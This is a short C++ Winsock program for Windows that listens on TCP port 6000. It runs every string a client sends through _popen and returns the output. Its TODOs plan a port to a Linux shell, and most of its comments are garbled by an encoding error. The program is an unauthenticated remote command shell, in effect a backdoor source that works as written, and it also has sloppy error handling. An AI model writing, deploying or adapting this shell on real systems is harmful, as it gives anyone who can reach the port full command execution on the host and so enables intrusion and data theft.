#include <iostream>
#include <string>
#include <cstring>
#include "winsock2.h"
#define BUF_SIZE 1024
#pragma comment(lib, "ws2_32.lib") 
#pragma warning(disable:4996)
using namespace std;

/**
* TODO: ? CMD -> shell
* TODO: windows -> linux
* TODO: �����У�����·�� + >
* TODO: ǰ����������Ƿ�������
*/

int main() {
	// �����׽���
	WSADATA wsaDate;
	WSAStartup(MAKEWORD(2, 2), &wsaDate);
	// ���������׽���
	SOCKET sockSrv = socket(AF_INET, SOCK_STREAM, 0);
	// ���׽���
	SOCKADDR_IN addrSrv;
	addrSrv.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	addrSrv.sin_family = AF_INET;
	addrSrv.sin_port = htons(6000);
	bind(sockSrv, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR));
	// �����ͻ�������
	listen(sockSrv, 5);

	SOCKADDR_IN addrClient;
	int len = sizeof(SOCKADDR);
	printf("%s\n", "Server is started...");
	while (1) {
		// ���տͻ�������
		SOCKET sockConn = accept(sockSrv, (SOCKADDR*)&addrClient, &len);
		// ������ʾ��֪ͨ�ͻ����Ѿ����ӵ�������
		char sendBuf[BUF_SIZE], recvBuf[BUF_SIZE];
        sprintf(sendBuf, "Welcome to Server, user IP: %s", inet_ntoa(addrClient.sin_addr));
        send(sockConn, sendBuf, strlen(sendBuf), 0);
		while (1) {
			memset(recvBuf, 0, BUF_SIZE);
			recv(sockConn, recvBuf, BUF_SIZE-1, 0);
			printf("catch command: %s\n", recvBuf);
			FILE* pipe = _popen(recvBuf, "r");
			while (int len = fread(sendBuf, 1, BUF_SIZE-1, pipe)) {
				send(sockConn, sendBuf, len, 0);
			}
			_pclose(pipe);
		}
		// �ر�����
		closesocket(sockConn);
	}
	return 0;
}
